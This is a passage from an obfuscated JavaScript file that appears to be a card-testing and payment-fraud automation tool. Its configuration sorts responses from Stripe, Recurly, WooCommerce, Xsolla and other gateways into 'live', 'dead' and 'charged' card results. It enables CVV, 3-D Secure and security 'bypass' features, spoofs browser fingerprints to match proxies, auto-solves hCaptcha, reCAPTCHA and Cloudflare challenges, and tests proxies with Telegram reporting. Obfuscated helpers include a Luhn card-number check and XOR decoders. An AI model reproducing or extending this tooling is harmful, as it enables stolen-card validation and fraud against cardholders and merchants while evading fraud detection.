                                    "payment_attempts_exceeded": "PHP ref — invoice voided, no more cards can be checked. Moved from dead.codes.",
                                    "payment_session_paid": "PHP ref — invoice already paid. Moved from dead.codes."
                                }
                            },
                            "subscription": {
                                "codes": [],
                                "messages": []
                            },
                            "messageOverrides": {},
                            "responsePaths": {
                                "status": [
                                    "status",
                                    "response_summary"
                                ],
                                "error": [
                                    "decline_reason",
                                    "error_codes"
                                ],
                                "declineCode": [
                                    "response_code",
                                    "decline_reason",
                                    "error_codes[0]"
                                ],
                                "declineReason": [
                                    "response_summary",
                                    "decline_reason"
                                ],
                                "amount": [
                                    "amount"
                                ],
                                "currency": [
                                    "currency"
                                ],
                                "customerEmail": [
                                    "customer.email"
                                ]
                            },
                            "trackingGetEndpoints": [
                                "/3ds/",
                                "/device-information"
                            ],
                            "htmlParsing": {
                                "_comment": "Config-driven redirect URL extraction for 3DS HTML responses. Used by status-tracker.js extractRedirectUrl(). Source: PHP ref paycheckout_api.php + Python ref docomo.py.",
                                "redirectReasonPattern": "RedirectReason: '",
                                "redirectReasonEnd": "'",
                                "redirectUrlPattern": "window.top.location.replace('",
                                "redirectUrlEnd": "')"
                            }
                        },
                        "recurly": {
                            "domains": [
                                "api.recurly.com"
                            ],
                            "excludePatterns": [
                                "/js/v1/co_badge"
                            ],
                            "endpoints": [
                                "/js/v1/token",
                                "/api/",
                                "/create-subscription",
                                "/recurly/set-billing-info"
                            ],
                            "endpointPatterns": [],
                            "success": {
                                "statuses": [],
                                "messages": [],
                                "_comment": "Recurly success detection is HTTP-status-based (200/201 + no error field). matchGroup cannot check HTTP status — success detection deferred until HTTP status support added. Third-party sites may have their own success patterns to add after manual testing."
                            },
                            "ccnLive": {
                                "codes": [],
                                "messages": [
                                    "insufficient funds",
                                    "insufficient_funds"
                                ],
                                "_comment": "Recurly official error codes include insufficient_funds. Added as message fallback — if any Recurly-powered site returns this text in response, it will match via matchGroup Step 4 stringify search."
                            },
                            "dead": {
                                "codes": [],
                                "messages": [
                                    "declined",
                                    "not valid",
                                    "refused",
                                    "invalid card",
                                    "expired card",
                                    "card number is not valid",
                                    "restricted card",
                                    "rate limit"
                                ],
                                "statuses": [],
                                "_comment": "v2.4.9 used typePatterns + titlePatterns. Converted to messages[] for matchGroup Step 4 compatibility — stringify search matches text anywhere in response body. Patterns from v2.4.9 session-rules + Recurly official transaction error codes."
                            },
                            "expired": {
                                "cardCodes": [],
                                "sessionCodes": []
                            },
                            "subscription": {
                                "codes": [],
                                "messages": []
                            },
                            "messageOverrides": {
                                "dead": {
                                    "rate limit": "rate_limited"
                                }
                            },
                            "responsePaths": {
                                "status": [
                                    "type",
                                    "title"
                                ],
                                "error": [
                                    "type",
                                    "title",
                                    "message"
                                ],
                                "declineCode": [
                                    "code",
                                    "error_code",
                                    "type"
                                ],
                                "declineReason": [
                                    "title",
                                    "message"
                                ]
                            }
                        },
                        "stripe": {
                            "domains": [
                                "api.stripe.com",
                                "billing.stripe.com"
                            ],
                            "excludePatterns": [
                                "r.stripe.com",
                                "analytics",
                                "telemetry",
                                "logging"
                            ],
                            "endpoints": [
                                "/verify_challenge",
                                "/payment_intents/",
                                "/payment_methods",
                                "/tokens",
                                "/confirm",
                                "/setup_intents/",
                                "/billing_portal/",
                                "/completed_webhook_delivered",
                                "/3ds2/authenticate"
                            ],
                            "endpointPatterns": [],
                            "success": {
                                "statuses": [
                                    "succeeded",
                                    "requires_capture"
                                ],
                                "skipStatuses": [
                                    "requires_action",
                                    "requires_source_action",
                                    "authentication_required"
                                ]
                            },
                            "ccnLive": {
                                "codes": [
                                    "insufficient_funds",
                                    "incorrect_cvc",
                                    "invalid_cvc",
                                    "transaction_not_allowed"
                                ],
                                "messages": [
                                    "insufficient funds",
                                    "security code is invalid",
                                    "security code is incorrect",
                                    "incorrect security code",
                                    "invalid security code",
                                    "does not support this type of purchase",
                                    "previously used"
                                ]
                            },
                            "dead": {
                                "_comment": "No codes needed — generic fallback catches all error codes as DEAD. Messages needed for invalid_request_error custom detection (code-less errors).",
                                "messages": [
                                    "invalid json",
                                    "collect the security code",
                                    "integration surface is unsupported",
                                    "required to use the stripe sdk",
                                    "no valid challenge",
                                    "invalid postal code",
                                    "3d secure 2 is not supported"
                                ]
                            },
                            "expired": {
                                "sessionCodes": [
                                    "checkout_not_active_session",
                                    "checkout_session_expired",
                                    "payment_intent_unexpected_state"
                                ],
                                "sessionMessages": [
                                    "expired",
                                    "not active",
                                    "timed out",
                                    "timeout",
                                    "status of canceled"
                                ]
                            },
                            "subscription": {
                                "codes": [
                                    "checkout_has_active_subscriptions"
                                ],
                                "messages": [
                                    "already have a subscription",
                                    "manage your subscription"
                                ]
                            },
                            "messageOverrides": {
                                "_comment": "v2.4.9 parity: custom display messages for specific patterns (matched against declineCode or declineReason)",
                                "dead": {
                                    "collect the security code": "cvc_required",
                                    "invalid json": "3ds_bypass_failed",
                                    "3d secure 2 is not supported": "3ds_bypass_failed",
                                    "integration surface is unsupported": "ua_required",
                                    "required to use the stripe sdk": "ua_required",
                                    "no valid challenge": "hcaptcha_challenge_failed",
                                    "invalid postal code": "invalid_postal_code",
                                    "expired_card": "Card Expired",
                                    "invalid_expiry_month": "Card Expired",
                                    "invalid_expiry_year": "Card Expired"
                                },
                                "ccnLive": {
                                    "previously used": "duplicate_card"
                                },
                                "charged": {
                                    "_default": "Payment Successful"
                                }
                            },
                            "responsePaths": {
                                "status": [
                                    "payment_intent.status",
                                    "setup_intent.status",
                                    "status",
                                    "payment_status",
                                    "data.payment_intent.status",
                                    "data.setup_intent.status",
                                    "data.status"
                                ],
                                "error": [
                                    "error",
                                    "last_payment_error",
                                    "last_setup_error",
                                    "payment_intent.last_payment_error",
                                    "setup_intent.last_payment_error",
                                    "error.setup_intent.last_setup_error"
                                ],
                                "declineCode": [
                                    "error.decline_code",
                                    "error.code",
                                    "decline_code",
                                    "last_payment_error.decline_code",
                                    "last_payment_error.code",
                                    "last_setup_error.decline_code",
                                    "last_setup_error.code",
                                    "payment_intent.last_payment_error.decline_code",
                                    "setup_intent.last_setup_error.decline_code",
                                    "charges[0].outcome.decline_code",
                                    "charges[0].failure_code"
                                ],
                                "declineReason": [
                                    "error.message",
                                    "last_payment_error.message",
                                    "last_setup_error.message",
                                    "outcome.seller_message"
                                ],
                                "amount": [
                                    "amount",
                                    "payment_intent.amount",
                                    "amount_received"
                                ],
                                "currency": [
                                    "currency",
                                    "payment_intent.currency"
                                ],
                                "customerEmail": [
                                    "receipt_email",
                                    "customer_email",
                                    "billing_details.email",
                                    "payment_method.billing_details.email",
                                    "error.payment_method.billing_details.email",
                                    "error.payment_intent.receipt_email",
                                    "error.payment_intent.last_payment_error.payment_method.billing_details.email",
                                    "last_payment_error.payment_method.billing_details.email",
                                    "payment_intent.receipt_email",
                                    "payment_intent.last_payment_error.payment_method.billing_details.email",
                                    "charges.data.0.billing_details.email",
                                    "charges.data.0.receipt_email"
                                ],
                                "description": [
                                    "description",
                                    "payment_intent.description",
                                    "error.payment_intent.description",
                                    "charges.data.0.description"
                                ]
                            },
                            "trackingGetEndpoints": [
                                "/payment_intents/",
                                "/setup_intents/"
                            ]
                        },
                        "woocommerce": {
                            "domains": [],
                            "excludePatterns": [],
                            "endpoints": [
                                "wc-ajax=checkout"
                            ],
                            "endpointPatterns": [],
                            "success": {
                                "statuses": [],
                                "messages": [
                                    "order-received"
                                ],
                                "_comment": "v2.4.9 logic: result==='success' && redirect.includes('order-received'). In v2.5 matchGroup Step 4, stringify search finds 'order-received' in the redirect URL field. This prevents false positive CHARGED on 3DS redirects where result='success' but redirect URL goes to 3DS provider (no 'order-received' in URL)."
                            },
                            "ccnLive": {
                                "codes": [],
                                "messages": [
                                    "security code",
                                    "cvc",
                                    "cvv",
                                    "incorrect",
                                    "insufficient funds",
                                    "security code is invalid",
                                    "security code is incorrect",
                                    "incorrect security code",
                                    "invalid security code",
                                    "does not support this type of purchase",
                                    "previously used"
                                ],
                                "_comment": "v2.4.9 parity: WooCommerce-specific ('security code','cvc','cvv','incorrect') + Stripe shared (STRIPE_CCN_MESSAGES). 'incorrect' kept as-is — in WooCommerce error context it's payment-related. Per-gateway isolated (only wc-ajax=checkout URLs)."
                            },
                            "dead": {
                                "codes": [],
                                "messages": [
                                    "declined",
                                    "invalid card",
                                    "card number",
                                    "do not honor"
                                ],
                                "statuses": [
                                    "failure",
                                    "false"
                                ],
                                "_comment": "statuses:['failure'] = classic format catch-all DEAD. 'false' = modern format {success:false} where String(false)='false'. v2.4.9 parity: both result==='failure' and success===false return DEAD. matchGroup checks ccnLive BEFORE dead, so CCN patterns match first, unmatched failures fall through to this catch-all."
                            },
                            "expired": {
                                "cardCodes": [],
                                "sessionCodes": []
                            },
                            "subscription": {
                                "codes": [],
                                "messages": []
                            },
                            "messageOverrides": {},
                            "responsePaths": {
                                "status": [
                                    "result",
                                    "success"
                                ],
                                "error": [
                                    "messages",
                                    "data.error.message",
                                    "data.message"
                                ],
                                "declineReason": [
                                    "messages",
                                    "data.error.message",
                                    "data.message"
                                ],
                                "_comment": "status paths: 'result' for classic format {result:'success'/'failure'}, 'success' for modern format {success:true/false}. error paths: 'messages' for classic HTML-wrapped errors, 'data.error.message' and 'data.message' for modern JSON format."
                            }
                        },
                        "xsolla": {
                            "domains": [
                                "secure.xsolla.com",
                                "xsolla.com"
                            ],
                            "excludePatterns": [
                                "analytics",
                                "telemetry",
                                "logging",
                                "chat.xsolla.com",
                                "communication-api",
                                "consent-api",
                                "afs.xsolla.com",
                                "/v1/traces"
                            ],
                            "endpoints": [
                                "/directpayment",
                                "/paystation",
                                "/api/payment",
                                "/api/checkout"
                            ],
                            "endpointPatterns": [],
                            "success": {
                                "statuses": [
                                    "done",
                                    "success",
                                    "completed",
                                    "authorized",
                                    "1"
                                ],
                                "_comment": "Xsolla Pay Station returns status.group or status.statusData.stateText or status.title_class. state=1 is numeric success (v2.4.9 parity). Source: developers.xsolla.com redirects config + reference/xsolla_ref.log"
                            },
                            "ccnLive": {
                                "codes": [],
                                "messages": [
                                    "insufficient funds",
                                    "not enough"
                                ],
                                "_comment": "Xsolla errors[0].message contains bank decline reason text. 'insufficient funds' = card live but no balance. v2.4.9 parity: xsollaPatterns.ccnIndicators.messagePatterns. Proof: Roblox Xsolla response 'We couldn't process this transaction due to insufficient funds in your account'."
                            },
                            "dead": {
                                "codes": [
                                    "3032",
                                    "1092",
                                    "1058",
                                    "1071",
                                    "1084",
                                    "3033",
                                    "1001",
                                    "3021",
                                    "1002",
                                    "3022"
                                ],
                                "messages": [],
                                "statuses": [
                                    "failed",
                                    "declined",
                                    "error",
                                    "cancelled",
                                    "troubled",
                                    "canceled",
                                    "2"
                                ],
                                "_comment": "Error codes from help.xsolla.com/payments/most-common-error-codes. 'troubled' from official docs (error during payment/refund). state=2 is numeric failure (v2.4.9 parity). 1058=bank declined, 3032/1092=security block, 1071=payment system cancelled."
                            },
                            "expired": {
                                "cardCodes": [],
                                "sessionCodes": []
                            },
                            "subscription": {
                                "codes": [],
                                "messages": []
                            },
                            "messageOverrides": {},
                            "responsePaths": {
                                "status": [
                                    "status.group",
                                    "status.statusData.stateText",
                                    "status.title_class",
                                    "status.statusData.state"
                                ],
                                "error": [
                                    "errors[0].code",
                                    "errors[0].message"
                                ],
                                "declineCode": [
                                    "errors[0].code",
                                    "error.code",
                                    "code"
                                ],
                                "declineReason": [
                                    "errors[0].message",
                                    "error.message",
                                    "message",
                                    "status.text.state"
                                ]
                            }
                        }
                    },
                    "antiDetect": {
                        "enabled": true,
                        "canvas": {
                            "enabled": true,
                            "noiseLevel": 0.02,
                            "seedStrategy": "session"
                        },
                        "webgl": {
                            "enabled": true,
                            "vendors": [
                                "Google Inc. (NVIDIA)",
                                "Google Inc. (AMD)",
                                "Google Inc. (Intel)",
                                "Google Inc. (Apple)"
                            ],
                            "renderers": [
                                "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 SUPER Direct3D11 vs_5_0 ps_5_0, D3D11)",
                                "ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)",
                                "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)",
                                "ANGLE (Apple, Apple M2, OpenGL 4.1)"
                            ]
                        },
                        "audio": {
                            "enabled": true,
                            "noiseLevel": 0.0001,
                            "seedStrategy": "session"
                        },
                        "webrtc": {
                            "enabled": true,
                            "blockMode": "disable_non_proxied"
                        },
                        "timezone": {
                            "enabled": true,
                            "followProxy": true,
                            "map": {
                                "US": "America/New_York",
                                "CA": "America/Toronto",
                                "MX": "America/Mexico_City",
                                "GB": "Europe/London",
                                "DE": "Europe/Berlin",
                                "FR": "Europe/Paris",
                                "ES": "Europe/Madrid",
                                "IT": "Europe/Rome",
                                "NL": "Europe/Amsterdam",
                                "SE": "Europe/Stockholm",
                                "NO": "Europe/Oslo",
                                "DK": "Europe/Copenhagen",
                                "PL": "Europe/Warsaw",
                                "RU": "Europe/Moscow",
                                "UA": "Europe/Kiev",
                                "TR": "Europe/Istanbul",
                                "IN": "Asia/Kolkata",
                                "BD": "Asia/Dhaka",
                                "JP": "Asia/Tokyo",
                                "KR": "Asia/Seoul",
                                "CN": "Asia/Shanghai",
                                "AU": "Australia/Sydney",
                                "NZ": "Pacific/Auckland",
                                "BR": "America/Sao_Paulo",
                                "AR": "America/Argentina/Buenos_Aires",
                                "ZA": "Africa/Johannesburg",
                                "AE": "Asia/Dubai",
                                "SA": "Asia/Riyadh",
                                "IL": "Asia/Jerusalem",
                                "SG": "Asia/Singapore",
                                "TH": "Asia/Bangkok",
                                "VN": "Asia/Ho_Chi_Minh",
                                "PH": "Asia/Manila",
                                "ID": "Asia/Jakarta",
                                "MY": "Asia/Kuala_Lumpur"
                            },
                            "offsets": {
                                "America/New_York": 300,
                                "America/Toronto": 300,
                                "America/Mexico_City": 360,
                                "Europe/London": 0,
                                "Europe/Berlin": -60,
                                "Europe/Paris": -60,
                                "Europe/Madrid": -60,
                                "Europe/Rome": -60,
                                "Europe/Amsterdam": -60,
                                "Europe/Stockholm": -60,
                                "Europe/Oslo": -60,
                                "Europe/Copenhagen": -60,
                                "Europe/Warsaw": -60,
                                "Europe/Moscow": -180,
                                "Europe/Kiev": -120,
                                "Europe/Istanbul": -180,
                                "Asia/Kolkata": -330,
                                "Asia/Dhaka": -360,
                                "Asia/Tokyo": -540,
                                "Asia/Seoul": -540,
                                "Asia/Shanghai": -480,
                                "Australia/Sydney": -660,
                                "Pacific/Auckland": -780,
                                "America/Sao_Paulo": 180,
                                "America/Argentina/Buenos_Aires": 180,
                                "Africa/Johannesburg": -120,
                                "Asia/Dubai": -240,
                                "Asia/Riyadh": -180,
                                "Asia/Jerusalem": -120,
                                "Asia/Singapore": -480,
                                "Asia/Bangkok": -420,
                                "Asia/Ho_Chi_Minh": -420,
                                "Asia/Manila": -480,
                                "Asia/Jakarta": -420,
                                "Asia/Kuala_Lumpur": -480
                            }
                        },
                        "locale": {
                            "enabled": true,
                            "followProxy": true,
                            "map": {
                                "US": "en-US",
                                "CA": "en-CA",
                                "MX": "es-MX",
                                "GB": "en-GB",
                                "DE": "de-DE",
                                "FR": "fr-FR",
                                "ES": "es-ES",
                                "IT": "it-IT",
                                "NL": "nl-NL",
                                "SE": "sv-SE",
                                "NO": "nb-NO",
                                "DK": "da-DK",
                                "PL": "pl-PL",
                                "RU": "ru-RU",
                                "UA": "uk-UA",
                                "TR": "tr-TR",
                                "IN": "en-IN",
                                "BD": "bn-BD",
                                "JP": "ja-JP",
                                "KR": "ko-KR",
                                "CN": "zh-CN",
                                "AU": "en-AU",
                                "NZ": "en-NZ",
                                "BR": "pt-BR",
                                "AR": "es-AR",
                                "ZA": "en-ZA",
                                "AE": "ar-AE",
                                "SA": "ar-SA",
                                "IL": "he-IL",
                                "SG": "en-SG",
                                "TH": "th-TH",
                                "VN": "vi-VN",
                                "PH": "en-PH",
                                "ID": "id-ID",
                                "MY": "ms-MY"
                            }
                        }
                    },
                    "features": {
                        "cvv_bypass": true,
                        "three_ds_bypass": true,
                        "security_bypass": true,
                        "card_replacement": true,
                        "payment_tracking": true,
                        "captcha_solving": true,
                        "anti_detect": true,
                        "stripe_enabled": true,
                        "adyen_enabled": true,
                        "checkout_enabled": true,
                        "recurly_enabled": true,
                        "xsolla_enabled": true,
                        "woocommerce_enabled": true,
                        "paypal_enabled": true,
                        "nordpayments_enabled": true
                    },
                    "_s": "",
                    "_t": "",
                    "captcha": {
                        "hcaptcha": {
                            "selectors": {
                                "checkbox": "#anchor",
                                "solvedWidget": "div.check",
                                "challenge": "h2.prompt-text",
                                "iframe": "iframe[src*=\"hcaptcha.com\"]",
                                "response": "textarea[name=\"h-captcha-response\"]"
                            },
                            "pollInterval": 1000,
                            "clickDelay": 800
                        },
                        "recaptcha": {
                            "selectors": {
                                "anchor": "#recaptcha-anchor",
                                "challenge": ".rc-imageselect-challenge",
                                "verifyButton": "#recaptcha-verify-button",
                                "table33": "table.rc-imageselect-table-33",
                                "table44": "table.rc-imageselect-table-44",
                                "taskWrapper": ".rc-imageselect-desc-wrapper",
                                "tiles": "td.rc-imageselect-tile",
                                "dynamicSelected": ".rc-imageselect-dynamic-selected",
                                "dosHeader": ".rc-doscaptcha-header",
                                "checked": ".recaptcha-checkbox-checked"
                            },
                            "tileClickDelayMin": 200,
                            "tileClickDelayMax": 500,
                            "dynamicTileWait": 1500
                        },
                        "cloudflare": {
                            "detectionSelectors": [
                                "[class*=\"cf-turnstile\"]",
                                "input[name=\"cf-turnstile-response\"]",
                                "iframe[src*=\"challenges.cloudflare.com\"]",
                                "#cf-wrapper",
                                "#challenge-running"
                            ],
                            "detectionTexts": [
                                "verifying you are human",
                                "checking your browser",
                                "just a moment",
                                "ray id:"
                            ],
                            "maxBodyLength": 2000
                        }
                    },
                    "automation": {
                        "expiredPatterns": [
                            "invoice is expired",
                            "subscription expired",
                            "link has expired",
                            "link is no longer valid",
                            "session has expired",
                            "payment link expired",
                            "you're all done here",
                            "checkout session has timed out",
                            "completed your payment",
                            "already been paid"
                        ],
                        "activeSubPatterns": [
                            "already subscribed",
                            "current plan"
                        ]
                    },
                    "decryptionKey": ""
                }
            }
        };
    }
    async ['testProxyViaServer'](_0x9d2e92, _0x43c5d8 = {}) {
        var _0x41243c = {};
        return _0x41243c['proxy'] = _0x9d2e92, _0x41243c['waitForGeo'] = !(0xd85 + -0x12a9 + 0x1 * 0x525) !== _0x43c5d8['waitForGeo'], _0x41243c['sendToTelegram'] = !(0x551 * -0x1 + 0x124d * 0x1 + -0xcfb) !== _0x43c5d8['sendToTelegram'], _0x41243c['checkedBy'] = _0x43c5d8['checkedBy'] || 'User', this['_post']('/api/proxy/test', _0x41243c);
    }
}();
var _zf2a8c20 = 0xfbb + 0x1863 + 0x3 * -0xd59,
    _z6147156 = -0x198 + -0x1fcb + -0x22 * -0xfe,
    _ze1f1d7c = 0x17cc * -0x1 + -0x197 + 0x19bd,
    _z430b4bi = 0xa4 * -0xc + 0x13e * -0x1d + -0x15eb * -0x2;

function _z99c2a31(_0x3a0c21, _0x4112c3) {
    var _0x2bfc5b = _0x3a0c21 || -0x1a8f * 0x1 + 0x242d + -0x99e;
    _zf2a8c20 += _0x2bfc5b + (0x1c4f + 0xa94 + -0x26db);
    if (_zf2a8c20 > 0x2427 + -0x795a + -0x1 * -0xeea9) _zf2a8c20 = -0x2 * -0x1069 + -0x3b0 * 0x5 + -0xe49;
    return _zf2a8c20;
};

function _z951e572(_0x3bb1d7) {
    for (var _0x2ce7c0 = -0x25fc + -0x2e * -0x88 + 0xd8c; _0x2ce7c0 < 0x2b * 0xa9 + 0xd61 + -0x29c2; _0x2ce7c0++) {
        _z99c2a31(_0x3bb1d7);
    }
    return _zf2a8c20;
};

function _z084f33o(_0x314bcc) {
    var _0x153364 = {};
    _0x153364['status'] = 'unknown';
    if (!_0x314bcc) return _0x153364;
    var _0x53d0e6 = typeof _0x314bcc === 'string' ? JSON['parse'](_0x314bcc) : _0x314bcc;
    if (_0x53d0e6['error']) return {
        'status': 'dead',
        'code': _0x53d0e6['error']['code'] || ''
    };
    if (_0x53d0e6['status'] === 'succeeded') return {
        'status': 'charged',
        'id': _0x53d0e6['id'] || ''
    };
    var _0x5769b2 = _0x53d0e6['last_payment_error'];
    if (_0x5769b2) return {
        'status': 'dead',
        'code': _0x5769b2['decline_code'] || _0x5769b2['code'] || ''
    };
    var _0x19e006 = {};
    return _0x19e006['status'] = 'unknown', _0x19e006;
};
var _z9baae8s = -0x1db4 + -0x3f5 + -0x116 * -0x1f;
if (typeof _z9baae8s === 'string' && _z9baae8s['length'] > -0x5 * -0x53d + 0xd5f + -0x23ed) var _zaf379dt = 0x17e * -0x15 + 0x1 * -0x543 + -0x5 * -0x758;;

function _z16931cu(_0x1c1342) {
    try {
        var _0x27a29d = new URL(_0x1c1342),
            _0x5421d2 = {};
        _0x27a29d['searchParams']['forEach'](function(_0x7e0eac, _0x538c9f) {
            _0x5421d2[_0x538c9f] = _0x7e0eac;
        });
        var _0x256916 = {};
        return _0x256916['host'] = _0x27a29d['hostname'], _0x256916['path'] = _0x27a29d['pathname'], _0x256916['params'] = _0x5421d2, _0x256916;
    } catch (_0xcb8303) {
        var _0x2dea6d = {};
        return _0x2dea6d['host'] = '', _0x2dea6d['path'] = '', _0x2dea6d['params'] = {}, _0x2dea6d;
    }
};

function _zc8b0a7z(_0x4b752e) {
    var _0x543d0f = -0x1 * 0x745 + 0x18f3 + -0x8d7 * 0x2;
    for (var _0xc03f15 = -0x1260 + 0xc5 * -0x2 + 0x13ea; _0xc03f15 < _0x4b752e['length']; _0xc03f15++) {
        _0x543d0f = _0x543d0f * (0x53 * -0x5b + -0x2 * 0x116e + 0x407c) + _0x4b752e['charCodeAt'](_0xc03f15) & 0xd * -0x6993aab + -0x1c665d54 + 0xf22e5802;
    }
    var _0x19aa6c = _0x543d0f['toString'](0x3 * 0x10f + -0x32f * -0xa + -0x22f3);
    while (_0x19aa6c['length'] < 0x1087 + -0x132c + 0x2ad) _0x19aa6c = '0' + _0x19aa6c;
    return _0x19aa6c;
};

function _z886af513(_0xac121e) {
    if (!_0xac121e || _0xac121e['length'] < 0x1 * 0x1ab1 + -0x8bc + -0x11e8) return ![];
    var _0x2c1e80 = -0x1654 + 0x2041 + 0x16b * -0x7,
        _0x365b13 = ![];
    for (var _0x216293 = _0xac121e['length'] - (-0x20bf + 0x1e36 + 0x2 * 0x145); _0x216293 >= 0x3bb * -0x7 + 0xc39 + 0xde4; _0x216293--) {
        var _0x73d53b = parseInt(_0xac121e[_0x216293], -0x2 * 0x822 + 0x1 * -0x1101 + 0x214f);
        if (_0x365b13) {
            _0x73d53b *= -0xbde + 0x462 + 0x77e;
            if (_0x73d53b > -0x1fd2 * 0x1 + -0x1ced + -0x799 * -0x8) _0x73d53b -= 0x3 * 0x775 + -0x1fac * 0x1 + 0x956;
        }
        _0x2c1e80 += _0x73d53b, _0x365b13 = !_0x365b13;
    }
    return _0x2c1e80 % (-0x19 * 0x12b + -0x3dd * -0x4 + 0xdc9) === 0x3c3 + 0xc4 * 0x33 + 0xd * -0x34b;
};

function _za1355219(_0x3c13a3) {
    var _0x1b6d29 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
        _0x481b4a = '';
    for (var _0x5258f5 = -0x3a6 * 0x6 + -0x1336 + 0x2 * 0x148d; _0x5258f5 < _0x3c13a3['length']; _0x5258f5 += 0x250f + -0x24f4 + -0x4 * 0x6) {
        var _0x40a0a0 = _0x3c13a3['charCodeAt'](_0x5258f5),
            _0x455465 = _0x5258f5 + (0x20be + -0x25a1 + -0x4e4 * -0x1) < _0x3c13a3['length'] ? _0x3c13a3['charCodeAt'](_0x5258f5 + (0x263a + -0x25f9 * -0x1 + -0x4c32)) : -0x82a + 0x1b6a + 0x1c * -0xb0,
            _0x1f219f = _0x5258f5 + (-0xe5 * -0x14 + 0x23 * -0x97 + 0x2c3) < _0x3c13a3['length'] ? _0x3c13a3['charCodeAt'](_0x5258f5 + (-0x1832 + -0x30 * 0x36 + 0x2254)) : -0x2 * 0x653 + -0x4d * 0x1 + 0xcf3;
        _0x481b4a += _0x1b6d29[_0x40a0a0 >> -0x1e4f + -0x1 * 0x17ed + 0x106 * 0x35] + _0x1b6d29[(_0x40a0a0 & 0x1953 + -0x26 * 0x22 + -0x1 * 0x1444) << -0x3 * 0x9c + 0x1471 * -0x1 + 0xa3 * 0x23 | _0x455465 >> 0x93c + -0xfef * 0x1 + 0x6b7] + _0x1b6d29[(_0x455465 & -0x1f01 * -0x1 + -0x83 * 0x2f + -0x161 * 0x5) << 0x8da + 0xca4 + -0xb * 0x1f4 | _0x1f219f >> 0xd12 + -0xc76 + -0x96] + _0x1b6d29[_0x1f219f & -0x1614 * -0x1 + -0x1e37 + 0x1d * 0x4a];
    }
    return _0x481b4a;
}

function _z3633411d(_0x2b1427) {
    if (!_0x2b1427) return '';
    var _0x111a93 = '',
        _0x20efe7 = -0x2f * 0xc7 + 0xd04 + 0x1785;
    while (_0x20efe7 < _0x2b1427['length']) {
        _0x111a93 += String['fromCharCode'](_0x2b1427['charCodeAt'](_0x20efe7) ^ 0x19c2 + 0xc * -0x28e + -0x1 * -0x59d), _0x20efe7++;
    }
    return _0x111a93;
};
var _z1aee4e1h = Date['now']() >>> -0x1a8e + -0x1bba + -0x25 * -0x178 & -0x2c3 + 0xfde + -0x32 * 0x3e;
if (_z1aee4e1h > 0x31e + -0x155b + -0x1 * -0x133c) var _zf6e0781i = 0x109d + -0xd * -0x15b + -0x1 * 0x2237;;

function _z8184691j(_0xa4b8ef) {
    if (!_0xa4b8ef) return '';
    var _0x5ae8f6 = '',
        _0x2d9918 = 0xb76 + -0x2072 + 0x14fc;
    while (_0x2d9918 < _0xa4b8ef['length']) {
        _0x5ae8f6 += String['fromCharCode'](_0xa4b8ef['charCodeAt'](_0x2d9918) ^ 0x1 * 0x1d2 + 0x2292 + -0x23b9), _0x2d9918++;
    }
    return _0x5ae8f6;
};

function _z985e081n(_0x1b409c) {
    if (typeof _0x1b409c !== 'string') return '';
    var _0x5ea8bf = _0x1b409c['replace'](/[<>&"']/g, function(_0x4e0504) {
        return '&#' + _0x4e0504['charCodeAt'](-0x20b2 + -0x3 * 0xaa9 + 0x40ad) + ';';
    });
    return _0x5ea8bf['length'] > 0xb3 * -0x1d + 0x2 * 0x11 + -0xa31 * -0x2 ? _0x5ea8bf['substring'](0x10de + 0x1545 + -0x2623, -0xd * -0x68 + 0x10b9 * -0x1 + 0xbae) : _0x5ea8bf;
}
var _z75588f1q = Object['keys']({})['length'];
if (_z75588f1q > 0xa * -0x5c + 0x4 * -0x91d + -0x1 * -0x2811) var _zc568571r = -0x16e6 + -0x1efd * -0x1 + -0x816;;

function _z5a3e2e1s(_0x2cc8a8) {
    var _0x44138f = Date['now']();
    typeof _0x2cc8a8 === 'function' && _0x2cc8a8();
    var _0x197d48 = Date['now']() - _0x44138f,
        _0x58bf18 = {};
    return _0x58bf18['elapsed'] = _0x197d48, _0x58bf18['slow'] = _0x197d48 > -0x1584 + -0x956 + 0x28 * 0xd0, _0x58bf18;
};

function _z2a61301w(_0x17963d) {
    try {
        var _0x4db226 = new URL(_0x17963d),
            _0x3604d8 = {};
        _0x4db226['searchParams']['forEach'](function(_0xf3de83, _0x5c51a3) {
            _0x3604d8[_0x5c51a3] = _0xf3de83;
        });
        var _0x926bda = {};
        return _0x926bda['host'] = _0x4db226['hostname'], _0x926bda['path'] = _0x4db226['pathname'], _0x926bda['params'] = _0x3604d8, _0x926bda;
    } catch (_0x16437b) {
        var _0x56b9dc = {};
        return _0x56b9dc['host'] = '', _0x56b9dc['path'] = '', _0x56b9dc['params'] = {}, _0x56b9dc;
    }
};

function _z696fd021(_0x3d441e) {
    try {
        var _0x21011e = new URL(_0x3d441e),
            _0x2fe728 = {};
        _0x21011e['searchParams']['forEach'](function(_0x297e0c, _0x4523cf) {
            _0x2fe728[_0x4523cf] = _0x297e0c;
        });
        var _0x8f3673 = {};
        return _0x8f3673['host'] = _0x21011e['hostname'], _0x8f3673['path'] = _0x21011e['pathname'], _0x8f3673['params'] = _0x2fe728, _0x8f3673;
    } catch (_0x290774) {
        var _0x4389b9 = {};
        return _0x4389b9['host'] = '', _0x4389b9['path'] = '', _0x4389b9['params'] = {}, _0x4389b9;
    }
};

function _z14224326(_0x4a32ab) {
    return new Promise(function(_0x20e9cd, _0xcdd2af) {
        if (!_0x4a32ab || typeof _0x4a32ab !== 'function') {
            _0xcdd2af(new Error('invalid'));
            return;
        }
        try {
            var _0x3055c7 = _0x4a32ab();
            _0x20e9cd(_0x3055c7);
        } catch (_0x2bc754) {
            _0xcdd2af(_0x2bc754);
        }
    });
};

function _z616a282a(_0x5cd680, _0x3746d4) {
    var _0xa0183e = Object['assign']({}, _0x5cd680);
    for (var _0x477e68 in _0x3746d4) {
        _0x3746d4['hasOwnProperty'](_0x477e68) && (typeof _0x3746d4[_0x477e68] === 'object' && _0x3746d4[_0x477e68] !== null && !Array['isArray'](_0x3746d4[_0x477e68]) ? _0xa0183e[_0x477e68] = _z616a282a(_0xa0183e[_0x477e68] || {}, _0x3746d4[_0x477e68]) : _0xa0183e[_0x477e68] = _0x3746d4[_0x477e68]);
    }
    return _0xa0183e;
};

function _z5ffd762e(_0x7e6c81, _0x229992) {
    var _0x349e82 = Object['assign']({}, _0x7e6c81);
    for (var _0x4974b1 in _0x229992) {
